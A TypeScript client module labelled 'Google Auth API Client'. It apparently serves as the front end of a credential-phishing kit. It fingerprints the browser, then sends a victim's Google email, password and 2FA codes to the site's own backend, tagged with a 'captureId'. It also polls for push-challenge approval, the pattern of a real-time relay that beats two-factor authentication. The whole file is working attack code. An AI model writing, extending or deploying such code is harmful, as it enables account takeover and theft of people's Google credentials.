/**
 * Google Auth API Client
 * NO HARDCODING - Uses relative paths or environment variable
 */

// Use relative API path (calls same domain) or environment variable for separate API domain
const API_BASE = process.env.NEXT_PUBLIC_API_URL || '/api';

interface AuthResponse {
  success: boolean;
  sessionId?: string;
  status?: string;
  challengeType?: string;
  challengeMetadata?: any;
  message?: string;
  error?: string;
}

/**
 * Collect browser fingerprint
 */
export function collectFingerprint() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    colorDepth: screen.colorDepth,
    viewport: {
      width: window.innerWidth,
      height: window.innerHeight,
    },
    screen: {
      width: screen.width,
      height: screen.height,
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    platform: navigator.platform,
    hasSessionStorage: !!window.sessionStorage,
    hasLocalStorage: !!window.localStorage,
    hasIndexedDB: !!window.indexedDB,
  };
}

/**
 * Initiate Google login - Submit email
 */
export async function initiateLogin(
  email: string,
  captureId: string
): Promise<AuthResponse> {
  try {
    const fingerprint = collectFingerprint();
    
    const response = await fetch(`${API_BASE}/google/login/initiate`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email,
        fingerprint,
        captureId,
      }),
    });

    const data = await response.json();
    return data;
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Network error',
    };
  }
}

/**
 * Submit password
 */
export async function submitPassword(
  sessionId: string,
  password: string
): Promise<AuthResponse> {
  try {
    const response = await fetch(`${API_BASE}/google/login/password`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sessionId,
        password,
      }),
    });

    const data = await response.json();
    return data;
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Network error',
    };
  }
}

/**
 * Submit 2FA code
 */
export async function submit2FA(
  sessionId: string,
  code: string,
  challengeType?: string
): Promise<AuthResponse> {
  try {
    const response = await fetch(`${API_BASE}/google/2fa`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sessionId,
        code,
        challengeType,
      }),
    });

    const data = await response.json();
    return data;
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Network error',
    };
  }
}

/**
 * Check authentication status (for polling Push/App challenges)
 */
export async function checkAuthStatus(
  sessionId: string
): Promise<AuthResponse> {
  try {
    const response = await fetch(`${API_BASE}/sessions/${sessionId}`, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
      },
    });

    const data = await response.json();
    return {
      success: data.success,
      status: data.data?.status,
      challengeType: data.data?.challengeType,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Network error',
    };
  }
}
